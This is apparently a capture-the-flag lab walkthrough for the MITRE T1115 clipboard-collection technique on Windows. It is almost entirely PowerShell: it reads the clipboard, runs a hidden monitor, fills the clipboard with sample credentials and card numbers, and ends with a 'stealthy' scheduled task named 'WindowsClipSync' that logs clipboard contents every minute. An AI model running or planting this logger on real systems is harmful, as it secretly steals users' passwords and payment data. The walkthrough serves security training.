# T1115 – Clipboard Data | Solution Walkthrough
**Difficulty:** Easy | **OS:** Windows | **MITRE:** T1115

## Step 1 – Instant Clipboard Read
```powershell
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Clipboard]::GetText()
# Server: db01.corp.local | User: sa | Password: SQL@Prod2024!
# (Pre-populated with sensitive data!)
```

## Step 2 – Start Clipboard Monitor
```powershell
Start-Process powershell -ArgumentList "-File C:\ProgramData\clip_monitor.ps1" -WindowStyle Hidden
```

## Step 3 – Simulate User Copying Sensitive Data
```powershell
# Simulate user actions:
Set-Clipboard "VPN credentials: user=admin pass=VPN@Corp123"
Start-Sleep 3
Set-Clipboard "Credit card: 4111-1111-1111-1111 CVV:123"
Start-Sleep 3
Set-Clipboard "Flag: $(Get-Content 'C:\Windows\System32\flag_T1115.txt')"
Start-Sleep 5
```

## Step 4 – Check Collected Data
```powershell
Get-Content "C:\Users\Public\clipboard_log.txt"
# All clipboard changes captured!
Get-Content "C:\Windows\System32\flag_T1115.txt"
# HACKTIFY{CLIPBOARD_COLLECTION_<hostname>}
```

## Stealthy Implementation
```powershell
# Persist as scheduled task running every 60s:
$a = New-ScheduledTaskAction -Execute "powershell.exe" -Argument `
    "-NonInteractive -Command `"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::GetText() | Out-File -Append C:\Windows\Temp\cb.log`""
$t = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Seconds 60) -Once -At (Get-Date)
Register-ScheduledTask -TaskName "WindowsClipSync" -Action $a -Trigger $t
```
